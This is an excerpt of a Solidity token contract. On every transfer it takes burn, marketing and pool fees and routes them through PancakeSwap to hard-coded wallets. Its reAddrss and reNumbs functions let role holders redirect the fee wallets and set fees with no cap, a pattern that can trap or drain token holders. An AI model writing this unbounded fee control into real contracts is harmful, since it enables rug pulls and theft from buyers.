...
contract Token is Ownable, IERC20Metadata {
    ...
    constructor() {
        ...
        _burns = 1;_marks = 2;_pools = 3;
        _maxsell = 5 * 10 ** decimals();

        _main = 0xdfbBb37a141578a497B0F30Bd857975fBb863Dd7;
        _mark = 0x9571205D4C30519fD833ac1fa3883868D3451F78;
        _pool = 0xbaa71CB677A5776D15900361548597B353C97245;
    ...
    function _transfer(
        ...
        // to recipient
        amount = amount * (100 - _burns - _marks -  _pools) / 100;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    ...
    function _swapTokenForToken(uint256 tokenAmount) private {
        ...
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount * _marks / (_marks + _pools), 0, path, _mark, block.timestamp+30);

        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount * _pools / (_marks + _pools), 0, path, _pool, block.timestamp+30);
    }
    ...
    function reAddrss(address mark, address pool) public {
        require(_roler[_msgSender()]);
        _mark = mark; _pool = pool;
    }

    function reNumbs(uint256 burn, uint256 mark, uint256 pool) 
        public {
        require(_roler[_msgSender()]);
        _burns = burn; _marks = mark; _pools = pool;
    }
